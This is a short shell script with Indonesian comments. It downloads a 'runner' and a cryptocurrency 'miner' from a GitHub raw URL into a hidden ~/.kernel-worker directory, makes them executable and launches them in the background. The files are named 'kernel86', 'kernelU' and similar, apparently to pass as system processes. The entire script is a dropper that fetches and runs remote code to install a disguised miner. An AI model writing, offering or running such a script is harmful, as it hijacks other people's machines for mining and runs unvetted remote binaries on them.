#!/bin/sh
set -e

REPO_URL="https://github.com/anonking-67/anon76/raw/refs/heads/main"
WORKDIR="$HOME/.kernel-worker"

# 1. Deteksi Arsitektur
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) RUNNER="kernel86"; MINER="kernelU" ;;
    aarch64|arm64) RUNNER="kernel64"; MINER="kernelX" ;;
    *) echo "[-] Arch not supported"; exit 1 ;;
esac

mkdir -p "$WORKDIR"
cd "$WORKDIR"

# 2. Download Runner & Miner
echo "[+] Downloading components for $ARCH..."
curl -fsSL -o "runner" "${REPO_URL}/${RUNNER}"
curl -fsSL -o "${MINER}" "${REPO_URL}/${MINER}"

chmod +x "runner" "${MINER}"

# 3. Jalankan Runner (Otomatis masuk background)
echo "[+] Starting Runner..."
./runner

echo "[+] Selesai! Cek proses dengan: ps aux | grep kernel"